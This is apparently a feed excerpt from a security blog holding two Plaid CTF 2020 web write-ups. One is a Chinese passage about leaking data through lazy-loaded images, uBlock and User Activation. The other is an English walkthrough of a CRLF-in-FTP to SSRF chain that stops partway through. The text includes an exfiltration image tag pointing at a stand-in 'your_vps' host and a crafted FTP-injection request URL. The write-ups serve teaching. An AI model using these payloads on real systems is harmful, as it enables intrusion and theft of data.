&#x5904;&#xFF0C;&#x89E6;&#x53D1;&#x8BF7;&#x6C42;&#x61D2;&#x52A0;&#x8F7D;&#x7684;&#x56FE;&#x7247;<code>&lt;img src=&quot;http://your_vps/exfiltrated&quot; loading=&quot;lazy&quot;&gt;</code>&#xFF0C;&#x8BF7;&#x6C42;&#x5230; exfiltrated &#x8DEF;&#x7531;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="hljs-string">&quot;/exfiltrated&quot;</span>, (req, res) =&gt; {</span><br><span class="line">    match = <span class="hljs-literal">true</span>;</span><br><span class="line">    res.send(<span class="hljs-string">&quot;exfiltrated&quot;</span>);</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6B64;&#x65F6;&#x5C06; match &#x8BBE;&#x7F6E;&#x4E3A; true &#xFF0C;&#x8BA9; injection &#x5B8C;&#x6210;&#x6211;&#x4EEC;&#x7684;&#x5224;&#x65AD;&#x56DE;&#x663E;&#x3002;</p></li></ol><p>&#x6574;&#x4E2A;&#x653B;&#x51FB;&#x6D41;&#x7A0B;&#x5927;&#x81F4;&#x5C31;&#x8FD9;&#x6837;&#xFF0C;&#x56FE;&#x5C31;&#x61D2;&#x5F97;&#x753B;&#x4E86;&#xFF0C;&#x56E0;&#x4E3A;&#x6574;&#x4E2A;&#x9898;&#x76EE;&#x4EE5;&#x53CA; wrtieup &#x8017;&#x8D39;&#x4E86;&#x6211;&#x4E0D;&#x5C11;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x6D89;&#x53CA;&#x5230;&#x7684;&#x6280;&#x672F;&#x90FD;&#x5206;&#x6790;&#x5B8C;&#x4E86;&#xFF0C;&#x5269;&#x4E0B;&#x5C31;&#x662F;&#x91CD;&#x590D; leak FLAG &#x4E86;&#x3002;&#xFF08;&#x95EE;&#x4E86;&#x4F5C;&#x8005;&#xFF0C;FLAG &#x4E00;&#x5171; 38 &#x4F4D;&#x2026;</p><h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2><p>&#x8FD9;&#x91CC;&#x5199;&#x4E00;&#x70B9;&#x9898;&#x5916;&#x8BDD;</p><h3 id="postMessage"><a href="#postMessage" class="headerlink" title="postMessage"></a>postMessage</h3><p>&#x5173;&#x4E8E; uBlock &#x4F7F;&#x7528; <code>postMessage</code> &#x590D;&#x5236; User Activation &#x7684;&#x65B9;&#x6CD5;&#x6211;&#x4ECD;&#x7136;&#x8868;&#x793A;&#x5B58;&#x7591;&#xFF0C;&#x56E0;&#x4E3A;&#x81EA;&#x5DF1;&#x6839;&#x636E;&#x9605;&#x8BFB;&#x7684;&#x6587;&#x6863;&#xFF0C;<code>postMessage</code>&#x4F20;&#x9012; User Activation &#x9700;&#x8981;&#x6709;&#x5BF9;&#x5E94;&#x7684;&#x914D;&#x7F6E;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">window</span>.parent.postMessage(<span class="hljs-string">&apos;resize&apos;</span>, {<span class="hljs-attr">includeUserActivation</span>: <span class="hljs-literal">true</span>});</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4F46;&#x662F;&#x6211;&#x5E76;&#x6CA1;&#x6709;&#x5728; uBlock &#x770B;&#x5230;&#x76F8;&#x5173;&#x7684;&#x914D;&#x7F6E;&#xFF0C;<code>postMessage</code>&#x90FD;&#x662F;&#x4F7F;&#x7528;&#x7684;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#xFF0C;&#x7136;&#x540E;&#x5173;&#x4E8E;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#x6211;&#x4E5F;&#x67E5;&#x770B;&#x4E86;&#x90E8;&#x5206; Chromium &#x7684;&#x6E90;&#x7801;&#xFF0C;&#x5BF9;&#x4E8E; UserActivation &#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#x662F; false &#x7684;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200425014346.png" alt></p><p>&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x901A;&#x8FC7; <a href="#Verification">Verification</a> &#x73AF;&#x8282;&#x6D4B;&#x8BD5;&#x5F97;&#x5230;&#x7684;&#x7ED3;&#x679C;&#x786E;&#x5B9E;&#x9700;&#x8981; uBlock &#x6765;&#x8FDB;&#x884C;&#xFF0C;&#x7531;&#x4E8E;&#x81EA;&#x5DF1;&#x65F6;&#x95F4;&#x5E76;&#x4E0D;&#x662F;&#x7279;&#x522B;&#x591A;&#xFF0C;&#x6700;&#x8FD1;&#x82B1;&#x592A;&#x591A;&#x65F6;&#x95F4;&#x5728;&#x8FD9;&#x9898;&#x7684;&#x590D;&#x76D8;&#x4E0A;&#xFF0C;&#x6240;&#x4EE5;&#x6700;&#x8FD1;&#x4E0D;&#x6253;&#x7B97;&#x518D;&#x6DF1;&#x7A76;&#x8FD9;&#x90E8;&#x5206;&#x7684;&#x5185;&#x5BB9;&#x4E86;&#xFF0C;&#x8FD9;&#x90E8;&#x5206;&#x7684;&#x5185;&#x5BB9;&#x4E0D;&#x4EC5;&#x6D89;&#x53CA;&#x5230; User Activation &#xFF0C;&#x8FD8;&#x6D89;&#x53CA;&#x5230;&#x4E00;&#x4E9B;&#x5173;&#x4E8E; User Activation &#x62BD;&#x8C61;&#x6A21;&#x578B;&#x7684;&#x4EE3;&#x7801;&#x5B9E;&#x73B0;&#xFF0C;&#x5982;&#x679C;&#x8981;&#x6DF1;&#x7A76;&#x7684;&#x8BDD;&#x5C31;&#x9700;&#x8981;&#x82B1;&#x6BD4;&#x8F83;&#x591A;&#x7684;&#x65F6;&#x95F4;&#x4E86;&#x3002;</p><h3 id="Verification"><a href="#Verification" class="headerlink" title="Verification"></a>Verification</h3><p>&#x81F3;&#x4E8E;&#x9A8C;&#x8BC1;&#x4E3A;&#x4EC0;&#x4E48;&#x4E00;&#x5B9A;&#x9700;&#x8981; uBlock &#x6765;&#x53C2;&#x4E0E;&#xFF0C;&#x8FD9;&#x90E8;&#x5206;&#x9A8C;&#x8BC1;&#x4E5F;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;&#x5C31;&#x662F;&#x81EA;&#x5DF1;&#x521B;&#x5EFA;&#x4E00;&#x4E2A; issue &#xFF0C;&#x5185;&#x5BB9;&#x8BBE;&#x7F6E;&#x4E3A;&#x4E00;&#x4E2A;&#x7528;&#x4E8E;&#x6D4B;&#x8BD5;&#x7684; FLAG&#xFF0C;&#x6BD4;&#x5982; PCTF{TEST} &#xFF0C;&#x5176;&#x4ED6;&#x7684;&#x8DDF; EXP &#x8FC7;&#x7A0B;&#x5DEE;&#x4E0D;&#x591A;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x628A; FLAG &#x7684;&#x5730;&#x5740;&#x6362;&#x4E3A;&#x81EA;&#x5DF1;&#x6D4B;&#x8BD5; FLAG &#x7684;&#x5730;&#x5740;&#x5373;&#x53EF;&#xFF0C;&#x7136;&#x540E;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;<strong>&#x5173;&#x95ED; Chrome &#x62D3;&#x5C55; uBlock</strong> &#x6765;&#x6D4B;&#x4E00;&#x904D;&#xFF08;&#x6700;&#x597D;&#x662F;&#x4ECE; Chrome &#x62D3;&#x5C55;&#x5173;&#x95ED;&#xFF0C;&#x4F7F;&#x7528;&#x62D3;&#x5C55;&#x672C;&#x8EAB;&#x7684;&#x5173;&#x95ED;&#x5E76;&#x4E0D;&#x662F;&#x5168;&#x7AD9;&#x5173;&#x95ED;&#xFF09;&#xFF0C;&#x591A;&#x6D4B;&#x8BD5;&#x51E0;&#x6B21;&#x5C31;&#x4F1A;&#x53D1;&#x73B0;&#x786E;&#x5B9E;&#x9700;&#x8981;&#x5F15;&#x5165; uBlock &#x6765;&#x5B9E;&#x73B0; Leak Data &#x3002;</p><h3 id="Text-Fragment"><a href="#Text-Fragment" class="headerlink" title="Text Fragment"></a>Text Fragment</h3><p>&#x8FD9;&#x91CC;&#x5176;&#x5B9E;&#x6BD4;&#x8F83;&#x53EF;&#x60DC;&#x7684;&#x662F; @wupco &#x5E08;&#x5085;&#xFF0C;&#x4ED6;&#x4E4B;&#x524D;&#x5173;&#x6CE8;&#x5230;&#x4E86;&#x8FD9;&#x4E2A; chrome Text Fragment &#x7684;&#x529F;&#x80FD;&#xFF0C;&#x5E76;&#x4E14;&#x4E5F;&#x5F15;&#x8D77;&#x4E86;&#x4ED6;&#x7684;&#x6CE8;&#x610F;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x5229;&#x7528;<code>#:~:text=flag{this_is_a_flag}</code>&#x7684;&#x5F62;&#x5F0F; leak data &#xFF0C;&#x53EF;&#x60DC;&#x4ED6;&#x8868;&#x793A;&#x6BD4;&#x8D5B;&#x7684;&#x65F6;&#x5019;&#x6CA1;&#x6709;&#x60F3;&#x8D77;&#x6765;&#x3002;&#xFF08;&#x4E0D;&#x6127;&#x662F;&#x8001; CTFer &#xFF0C;&#x4E00;&#x5F00;&#x53E3;&#x5C31;&#x77E5;&#x9053;&#x662F;&#x8001; CTFer &#x4E86;</p><blockquote><p>&#x200B;    How about using #:~:text=flag{this_is_a_flag} and onscroll to leak data?</p></blockquote><div class="twitter-wrapper"><blockquote class="twitter-tweet"><a href="https://twitter.com/wupco1996/status/1226938811147522060" target="_blank" rel="noopener"></a></blockquote></div><script async defer src="https://platform.twitter.com/widgets.js" charset="utf-8"></script><h3 id="Other-Web-Challanges"><a href="#Other-Web-Challanges" class="headerlink" title="Other Web Challanges"></a>Other Web Challanges</h3><p>&#x8FD9;&#x6B21;&#x6BD4;&#x8D5B;&#x7684; Web &#x90FD;&#x6BD4;&#x8F83;&#x6709;&#x610F;&#x601D;&#xFF0C;<a href="https://blog.zeddyu.info/2020/04/20/Plaid-CTF-2020-Web-1/">Contrived Web Problem</a> &#x662F;&#x4E00;&#x9053; FTP &#x5230; SSRF &#x7684;&#x5229;&#x7528;&#x94FE;&#xFF0C;wp &#x53EF;&#x4EE5;&#x770B;&#x6211;&#x7684;&#x535A;&#x5BA2;&#xFF0C;&#x4F46;&#x662F;&#x53EA;&#x6709;&#x82F1;&#x6587;&#x90E8;&#x5206;&#xFF0C;&#x5E76;&#x4E14;&#x6CA1;&#x6709;&#x5B8C;&#x6574;&#x7684; payload &#xFF0C;&#x53EA;&#x804A;&#x4E86;&#x804A;&#x5927;&#x81F4;&#x7684;&#x601D;&#x8DEF;&#xFF0C;&#x800C;&#x4E14;&#x82F1;&#x6587;&#x6C34;&#x5E73;&#x53EF;&#x80FD;&#x6BD4;&#x8F83;&#x62D9;&#xFF0C;&#x4E0D;&#x77E5;&#x9053;&#x4EE5;&#x540E;&#x81EA;&#x5DF1;&#x6709;&#x6CA1;&#x6709;&#x7A7A;&#x5199;&#x4E2D;&#x6587;&#x7684;&#xFF0C;&#x81EA;&#x5DF1;&#x4E5F;&#x4E0D;&#x592A;&#x786E;&#x5B9A;&#x3002; Mooz Chat &#x542C; @wupco &#x5E08;&#x5085;&#x8BF4;&#x662F;&#x4E00;&#x4E2A;&#x4E2D;&#x95F4;&#x4EBA;&#x52AB;&#x6301;&#x7684; web &#x9898;&#xFF0C;&#xFF08;&#x592A;&#x5F3A;&#x5927;&#x4E86;&#xFF0C;&#x9700;&#x8981;&#x9006;&#x5411;&#xFF0C;&#x8868;&#x793A;&#x5355;&#x51ED;&#x81EA;&#x5DF1;&#x5F04;&#x4E0D;&#x4E86;&#xFF09;&#xFF0C;&#x4F46;&#x662F;&#x4E2D;&#x95F4;&#x4EBA;&#x52AB;&#x6301;&#x7684;&#x9898;&#x76EE;&#x786E;&#x5B9E;&#x4EE4;&#x4EBA;&#x8033;&#x76EE;&#x4E00;&#x65B0;&#xFF01;&#x5982;&#x679C;&#x5E08;&#x5085;&#x4EEC;&#x6709;&#x76F8;&#x5173;&#x7684;&#x601D;&#x8DEF;&#x6216;&#x8005; wp &#x6B22;&#x8FCE;&#x4E00;&#x8D77;&#x4EA4;&#x6D41;&#xFF01;</p><h3 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h3><p>&#x8FD9;&#x6B21;&#x6BD4;&#x8D5B;&#x7684;&#x9898;&#x4E2A;&#x4EBA;&#x89C9;&#x5F97;&#x8FD8;&#x662F;&#x6BD4;&#x8F83;&#x504F;&#x201C;&#x4FA7;&#x4FE1;&#x9053;&#x201D;&#x7684;&#xFF0C;&#x8FD9;&#x7C7B;&#x7684;&#x9898;&#x76EE;&#x6211;&#x90FD;&#x89C9;&#x5F97;&#x975E;&#x5E38;&#x597D;&#x73A9;&#xFF0C;&#x56E0;&#x4E3A;&#x4E0D;&#x540C;&#x4E8E;&#x4F20;&#x7EDF;&#x7684; Web &#x653B;&#x51FB;&#xFF0C;&#x8FD8;&#x901A;&#x5E38;&#x5F15;&#x5165;&#x4E86;&#x5F88;&#x591A;&#x6BD4;&#x8F83;&#x65B0;&#x7684;&#x7406;&#x5FF5;&#x4E0E;&#x653B;&#x51FB;&#x94FE;&#xFF0C;&#x867D;&#x7136; User Activation &#x76F8;&#x5173;&#x7684;&#x90E8;&#x5206;&#x8FD8;&#x6CA1;&#x6709;&#x5B8C;&#x5168;&#x5F04;&#x660E;&#x767D;&#xFF0C;&#x800C;&#x4E14;&#x8FD9;&#x4E2A;&#x9898;&#x4F5C;&#x8005;&#x8FD8;&#x662F;&#x6545;&#x610F;&#x5F15;&#x5165;&#x7684; uBlock &#x6765;&#x534F;&#x52A9;&#x6211;&#x4EEC;&#x505A;&#x9898;&#xFF0C;&#x4E5F;&#x7B97;&#x662F;&#x6BD4;&#x8F83;&#x7684;&#x53CB;&#x597D;&#x4E86;&#xFF0C;&#x53EA;&#x4E0D;&#x8FC7;&#x53EF;&#x80FD;&#x6211;&#x4EEC;&#x6CA1;&#x6709;&#x5B8C;&#x5168; Get &#x5230;&#x51FA;&#x9898;&#x4EBA;&#x7684;&#x70B9;&#x3002;&#x6240;&#x4EE5;&#x8FD9;&#x6B21;&#x6BD4;&#x8D5B;&#x5BF9;&#x6211;&#x800C;&#x8A00;&#x66F4;&#x8BA9;&#x4EBA;&#x89C9;&#x5F97;&#x8033;&#x76EE;&#x4E00;&#x65B0;&#x7684;&#x662F; Chrome &#x65B0;&#x7279;&#x6027; Text Fragemnts &#xFF0C;&#x8BA9;&#x4EBA;&#x7814;&#x7A76;&#x7684;&#x66F4;&#x591A;&#x7684;&#x662F; User Activation &#x3002;</p><p>&#x867D;&#x7136;&#x8FD9;&#x79CD;&#x9898;&#x76EE;&#x5BF9;&#x4E8E;&#x5B9E;&#x6218;&#x53EF;&#x80FD;&#x663E;&#x5F97;&#x9E21;&#x808B;&#xFF0C;&#x751A;&#x81F3;&#x201C;&#x6BEB;&#x65E0;&#x4F5C;&#x7528;&#x201D;&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x7C7B;&#x9898;&#x76EE;&#x6211;&#x89C9;&#x5F97;&#x6253;&#x5F00;&#x4E86;&#x81EA;&#x5DF1;&#x7684;&#x89C6;&#x91CE;&#xFF0C;&#x8BA9;&#x6211;&#x5173;&#x6CE8;&#x5230;&#x4E86;&#x66F4;&#x591A;&#x65B0;&#x4E1C;&#x897F;&#xFF0C;&#x66F4;&#x4F55;&#x51B5;&#x8FD9;&#x7C7B;&#x7684;&#x9898;&#x76EE;&#x5728;&#x56FD;&#x5185;&#x8FD8;&#x662F;&#x5F88;&#x5C11;&#x89C1;&#x5230;&#x7684;&#xFF0C;&#x6BD5;&#x7ADF;&#x5F04;&#x8FD9;&#x7C7B;&#x9898;&#x76EE;&#xFF0C;&#x4ECE;&#x4E3B;&#x8981;&#x653B;&#x51FB;&#x94FE;&#x6784;&#x9020;&#x5230;&#x7EC6;&#x8282;&#x8BBE;&#x7F6E;&#x90FD;&#x9700;&#x8981;&#x7CBE;&#x5FC3;&#x7684;&#x63E3;&#x6469;&#x4E0E;&#x63A8;&#x6572;&#xFF0C;&#x66F4;&#x4F55;&#x51B5;&#x662F;&#x201C;&#x4FA7;&#x4FE1;&#x9053;&#x201D;&#x7684;&#x9898;&#x76EE;&#xFF0C;&#x6CA1;&#x6709;&#x6DF1;&#x539A;&#x7684;&#x6280;&#x672F;&#x79EF;&#x6DC0;&#x51FA;&#x4E0D;&#x6765;&#x8FD9;&#x7C7B;&#x8BA9;&#x5168;&#x7403;&#x5927;&#x90E8;&#x5206; CTFer &#x7206;&#x96F6;&#x7684;&#x9AD8;&#x96BE;&#x5EA6;&#x7684;&#x9898;&#x76EE;&#xFF0C;&#x4E5F;&#x5E0C;&#x671B;&#x56FD;&#x5185;&#x4EE5;&#x540E;&#x80FD;&#x51FA;&#x73B0;&#x4E00;&#x4E9B;&#x8FD9;&#x7C7B;&#x9AD8;&#x8D28;&#x91CF;&#x7684;&#x9898;&#x76EE;&#x5427;&#x3002;</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://www.chromestatus.com/feature/5722065667620864" target="_blank" rel="noopener">User Activation v2</a></p><p><a href="https://mustaqahmed.github.io/user-activation-v2/" target="_blank" rel="noopener">User Activation v2 (UAv2)</a></p><p><a href="https://developers.google.com/web/updates/2019/01/user-activation" target="_blank" rel="noopener">Making user activation consistent across APIs</a></p><p><a href="https://docs.google.com/document/d/1mcxB5J_u370juJhSsmK0XQONG2CIE3mvu827O-Knw_Y/edit#heading=h.hy5wkxbrpq6o" target="_blank" rel="noopener">Existing Chrome APIs using user gestures</a></p><p><a href="https://github.com/dtapuska/useractivation" target="_blank" rel="noopener">JS API for querying User Activation</a></p><p><a href="https://mustaqahmed.github.io/user-activation-delegation/" target="_blank" rel="noopener">Activation Transfer through postMessages</a></p></body></html>]]></content>
        <author>
            <name><![CDATA[Zedd’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.zeddyu.info/2020/04/20/Plaid-CTF-2020-Web-1/</id>
        <title><![CDATA[Plaid CTF 2020 Contrived Web Problem Write Up]]></title>
        <updated>2021-06-01T02:31:38+08:00</updated>
        <link href="https://blog.zeddyu.info/2020/04/20/Plaid-CTF-2020-Web-1/"/>
        <content type="text/html" src="https://blog.zeddyu.info/2020/04/20/Plaid-CTF-2020-Web-1/"><![CDATA[<html><head></head><body><p>Here is my write up of Contrived Web Problem in Plaid CTF 2020.</p><a id="more"></a><p>[TOC]</p><h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>You can get the attachment of the chall in this <a href="https://github.com/ZeddYu/Plaid-CTF-2020-Web" target="_blank" rel="noopener">repo</a>.</p><ol><li>You can find CRLF in ftp then use CRLF to inject ftp command.</li><li>You can use PORT command to build a TCP connection with rabbitmq server.</li><li>Make a HTTP message which can let the nodemailer send a email containing the flag as a attachment to your email through rabbitmq web api.</li><li>Hide this HTTP message in a PNG. Upload the picture as your profile.</li><li>Use the REST command to cut the PNG and let PETR command return the HTTP message which is in the PNG to rabbitmq server.</li><li>Check FLAG in your email.</li></ol><h2 id="CRLF-in-FTP"><a href="#CRLF-in-FTP" class="headerlink" title="CRLF in FTP"></a>CRLF in FTP</h2><p>We guess there should be a CRLF in FTP at first. And use <code>%250d%250a</code> to test it because it use the following code.</p><p></p><figure class="highlight typescript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> (parsed.protocol === <span class="hljs-string">&quot;ftp:&quot;</span>) {</span><br><span class="line">  <span class="hljs-keyword">let</span> username = <span class="hljs-built_in">decodeURIComponent</span>(parsed.username);</span><br><span class="line">  <span class="hljs-keyword">let</span> password = <span class="hljs-built_in">decodeURIComponent</span>(parsed.password);</span><br><span class="line">  <span class="hljs-keyword">let</span> filename = <span class="hljs-built_in">decodeURIComponent</span>(parsed.pathname);</span><br><span class="line">  <span class="hljs-keyword">let</span> ftpClient = <span class="hljs-keyword">await</span> connectFtp({</span><br><span class="line">    host: parsed.hostname,</span><br><span class="line">    port: parsed.port !== <span class="hljs-string">&quot;&quot;</span> ? <span class="hljs-built_in">parseInt</span>(parsed.port) : <span class="hljs-literal">undefined</span>,</span><br><span class="line">    user: username !== <span class="hljs-string">&quot;&quot;</span> ? username : <span class="hljs-literal">undefined</span>,</span><br><span class="line">    password: password !== <span class="hljs-string">&quot;&quot;</span> ? password : <span class="hljs-literal">undefined</span>,</span><br><span class="line">  });</span><br><span class="line">  image = <span class="hljs-keyword">await</span> ftpClient.get(filename);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>Send this url through <code>api/image</code>.</p><p></p><figure class="highlight llvm hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /api/image?url=ftp://<span class="hljs-number">2</span>:<span class="hljs-number">2</span><span class="hljs-symbol">%250</span>d<span class="hljs-symbol">%250</span>aPORT<span class="hljs-symbol">%20172</span>,<span class="hljs-number">32</span>,<span class="hljs-number">56</span>,<span class="hljs-number">72</span>,<span class="hljs-number">61</span>,<span class="hljs-number">56</span><span class="hljs-symbol">%250</span>d<span class="hljs-symbol">%250</span>aREST<span class="hljs-symbol">%206</span><span class="hljs-symbol">%250</span>d<span class="hljs-symbol">%250</span>aRETR<span class="hljs-symbol">%20</span><span class="hljs-symbol">%252</span>fuser<span class="hljs-symbol">%252</span>fb<span class="hljs-number">21791e2</span><span class="hljs-number">-6016</span><span class="hljs-number">-4</span><span class="hljs-keyword">c</span><span class="hljs-number">36</span><span class="hljs-number">-8</span>f<span class="hljs-number">9</span>a<span class="hljs-number">-6054750</span>d<span class="hljs-number">2</span>b<span class="hljs-number">5</span>a<span class="hljs-symbol">%252</span>fprofile<span class="hljs-symbol">%252</span>epng<span class="hljs-title">@ftp</span>:<span class="hljs-number">21</span>/user/b<span class="hljs-number">21791e2</span><span class="hljs-number">-6016</span><span class="hljs-number">-4</span><span class="hljs-keyword">c</span><span class="hljs-number">36</span><span class="hljs-number">-8</span>f<span class="hljs-number">9</span>a<span class="hljs-number">-6054750</span>d<span class="hljs-number">2</span>b<span class="hljs-number">5</span>a/profile.png</span><br></pre></td></tr></tbody></table></figure><p></p><p>This url will make a request like this.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9f